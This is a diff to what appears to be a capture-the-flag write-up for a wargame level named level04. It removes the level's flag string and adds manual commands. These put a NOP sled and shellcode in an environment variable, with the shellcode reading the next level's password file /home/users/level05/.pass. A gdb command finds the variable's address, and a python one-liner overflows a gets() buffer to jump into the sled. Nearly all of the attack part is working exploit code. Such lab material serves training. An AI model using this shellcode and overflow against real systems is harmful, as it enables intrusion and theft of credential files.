@@ -75,6 +75,10 @@ EGG=$'<nop+shellcode>' bash -c 'printf "<payload>" | ./level04'
 
 No FIFO needed — `gets()` reads directly from stdin pipe without stdio buffering issues.
 
-## Flag
+## Manual Commands
+export EGG=$(python -c "import sys; sys.stdout.write('\x90'*200+'\xeb\x2c\x5b\x31\xc0\x88\x43\x19\xb0\x05\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\xb2\x40\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xcf\xff\xff\xff/home/users/level05/.pass')");
+gdb -q -ex "set follow-fork-mode child" -ex "b gets" -ex "run" -ex 'p getenv("EGG")' -ex quit --args /home/users/level04/level04 <<< ""
 
-`3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
+### for example EGG = -10186 converts to 0xFFFFD836
+### So EGG is at 0xffffd836. Add 100 for the NOP sled landing: 0xffffd836 + 0x64 = 0xffffd89a
+python -c "import sys; sys.stdout.write('A'*156+'\x9a\xd8\xff\xff')" | /home/users/level04/level04
